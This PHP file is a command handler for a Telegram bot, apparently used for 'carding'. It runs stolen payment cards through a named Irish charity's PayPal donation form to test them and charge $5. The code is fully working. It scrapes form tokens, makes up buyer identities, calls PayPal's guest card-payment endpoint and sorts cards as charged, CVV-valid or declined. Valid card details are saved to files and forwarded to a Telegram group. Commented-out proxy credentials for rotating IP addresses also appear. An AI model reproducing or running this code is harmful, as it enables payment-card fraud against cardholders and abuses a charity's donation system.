<?php

#----------------------------------------------------------------------#
#   GATE: PAYPAL COMMERCE CHARGE - (AMOUNT: Custom)                    #
#   SITE: https://www.zamdaireland.org/donations/donation-form/        #
#----------------------------------------------------------------------#

if ((strpos($message, "/pp") === 0) || (strpos($message, "!pp") === 0)){

  
  if (in_array($userId, $vip_users) === false){
    sendMessage($chatId,$vip_unauth_msg, $message_id);
    return;
    }

sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }




//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";



//================ [ EXPLODE & LISTA ] ===============//
$lista = substr($message, 4);
  	$amount = multiexplode(array("*"), $lista)[1];
        preg_match_all('!\d+!', $amount, $amot);
        $amt = $amot[0][0];;
    if($amt > 50) { $amt = "50"; }
    if($amt < 1) { $amt = "1"; }
  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }
  
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";  

	$lista = "$cc|$mes|$ano|$cvv";
  
  

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
//$bank = getStr($bindata,'"bank": {"name": "', '"')));
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";

  
//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
  
$rand = " $name - $last - $street - $city - $zip - $state - $email - $phone";
//echo $rand;
  
/*  
//=================== [Proxys Section] ==================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)) { $ip = "Live! ✅"; }
if (empty($ip1)) { $ip = "Dead! ❌"; }
*/
  
  
//=======================[1 REQ]=============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.zamdaireland.org/give/donation-form?giveDonationFormInIframe=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: www.zamdaireland.org',
    'Referer: https://www.zamdaireland.org/donations/donation-form/',
    'Sec-Fetch-Dest: iframe',
    'sec-fetch-mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Upgrade-Insecure-Requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
curl_close($ch);

$hash = trim(strip_tags(getStr($result1,'name="give-form-hash" value="','"')));
$form_prefix = trim(strip_tags(getStr($result1,'name="give-form-id-prefix" value="', '"')));
$form_id = trim(strip_tags(getStr($result1,'name="give-form-id" value="','"')));
$price_id = trim(strip_tags(getStr($result1,'name="give-price-id" value="','"')));



//=======================[2 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.zamdaireland.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqkTkXET97LKgN3Na',
    'Host: www.zamdaireland.org',
    'origin: https://www.zamdaireland.org',
    'Referer: https://www.zamdaireland.org/give/donation-form?giveDonationFormInIframe=1',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-honeypot"


------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-id-prefix"

'.$form_prefix.'
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-id"

'.$form_id.'
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-title"

Donation Form
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-current-url"

https://www.zamdaireland.org/donations/donation-form/
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-url"

https://www.zamdaireland.org/give/donation-form/
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-minimum"

1
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-maximum"

1000000
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-form-hash"

'.$hash.'
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-price-id"

custom
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-amount"

5
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give_first"

'.$name.'
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give_last"

'.$last.'
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give_email"

'.$name.'2'.rand(11,99).'@gmail.com
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="payment-mode"

paypal-commerce
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give-gateway"

paypal-commerce
------WebKitFormBoundaryqkTkXET97LKgN3Na
Content-Disposition: form-data; name="give_embed_form"

1
------WebKitFormBoundaryqkTkXET97LKgN3Na--');
$result2 = curl_exec($ch);
$id = trim(strip_tags(getStr($result2,'"id":"','"')));


  
//=======================[3 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: www.paypal.com',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://www.paypal.com',
    'paypal-client-context: '.$id.'',
    'paypal-client-metadata-id: '.$id.'',
    'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_2a4cf438b4_mdi6mzm6mzg&buttonSessionID=uid_1717b59c6e_mdi6mzm6mzg&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVlxOWFSaEduandmcGZRNk5yalhhS2R3YW9Gby15LWRhbU9nOWdvV0dRZ3QzdXRZM25VY1pKbXJDRjgxbTJZZEdDUjlKckZLLWtyRDZ5QkUmbWVyY2hhbnQtaWQ9WDgyVjlIRVBRUzNGUSZjb21wb25lbnRzPWhvc3RlZC1maWVsZHMsYnV0dG9ucyZsb2NhbGU9ZW5fVVMmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZ2YXVsdD1mYWxzZSZpbnRlbnQ9Y2FwdHVyZSZjdXJyZW5jeT1FVVIiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUENQIiwiZGF0YS11aWQiOiJ1aWRfZmFpcGZlc3Z6dW1jc3dzd3liaHdld2d5c2hmZHRjIn19&disable-card=&token='.$id.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',
    'x-app-name: standardcardfields',
    'x-country: US'
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"'.$zip.'","securityCode":"'.$cvv.'"},"phoneNumber":"912664'.rand(1111,9999).'","firstName":"'.$name.'","lastName":"'.$last.'","billingAddress":{"givenName":"'.$name.'","familyName":"'.$last.'","line1":null,"line2":null,"city":null,"state":null,"postalCode":"'.$zip.'","country":"US"},"email":"'.$name.'2'.rand(11,99).'@gmail.com","currencyConversionType":"PAYPAL"},"operationName":null}');
$result3 = curl_exec($ch);
$msg = ucwords(strtolower(trim(strip_tags(getStr($result3,'"message":"','"')))));
$code = ucwords(strtolower(trim(strip_tags(getStr($result3,'"code":"','"')))));


  if(!strpos($result3, '"errors"') === true) {
//=======================[4 REQ]============================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.zamdaireland.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order='.$id.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTC4A0BE4vUKsP6vA',
    'Host: www.zamdaireland.org',
    'origin: https://www.zamdaireland.org',
    'Referer: https://www.zamdaireland.org/give/donation-form?giveDonationFormInIframe=1',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-honeypot"


------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-id-prefix"

'.$form_prefix.'
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-id"

'.$form_id.'
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-title"

Donation Form
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-current-url"

https://www.zamdaireland.org/donations/donation-form/
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-url"

https://www.zamdaireland.org/give/donation-form/
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-minimum"

1
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-maximum"

1000000
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-form-hash"

'.$hash.'
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-price-id"

custom
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-amount"

5
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give_first"

'.$name.'
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give_last"

'.$last.'
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give_email"

'.$name.'2'.rand(11,99).'@gmail.com
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="payment-mode"

paypal-commerce
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give-gateway"

paypal-commerce
------WebKitFormBoundaryTC4A0BE4vUKsP6vA
Content-Disposition: form-data; name="give_embed_form"

1
------WebKitFormBoundaryTC4A0BE4vUKsP6vA--');
$result4 = curl_exec($ch);
$err = ucwords(strtolower(trim(strip_tags(getStr($result4,'"issue":"','"')))));
}


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);


  
  
//==================[Responses]======================//
  
if((strpos($result4, '"success":true')) || (strpos($result4, '"success": true'))){
  
    $tmsg = '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Charged $5</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$result4.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/pp_ccc.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
sendMsg('-4077073881', "$fmsg");
}

elseif (strpos($result3, 'INVALID_BILLING_ADDRESS')){
  
  $tmsg = '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$code.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs𝐭]</a>';

  sendMessage($chatId, ''.$tmsg.'', $message_id);
  file_put_contents('Others/Save/pp_cvv.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

  $fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
  sendMsg('-4077073881', "$fmsg");
  sendMsg('-4077073881', "$fmsg");
  }
  
elseif (strpos($result3, 'EXISTING_ACCOUNT_RESTRICTED')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$code.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif (strpos($result3, 'INVALID_SECURITY_CODE')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED CCN!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$code.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs𝐭]</a>', $message_id);
	file_put_contents('Others/Save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}
  
elseif (strpos($result3, '"errors"')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$code.'</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$msg.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}
  
elseif(strpos($result4, '"success":false')) {
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Auth_Pass_0$</b>%0A𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ➺ <b>'.$err.'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a></i>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
	file_put_contents('Others/Save/cvv.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
}
  
else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b><i> 𝐏𝐚𝐲𝐩𝐚𝐥 𝐂𝐨𝐦𝐦𝐞𝐫𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.$result3.'</b>%0A</i><a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}
  

  


curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>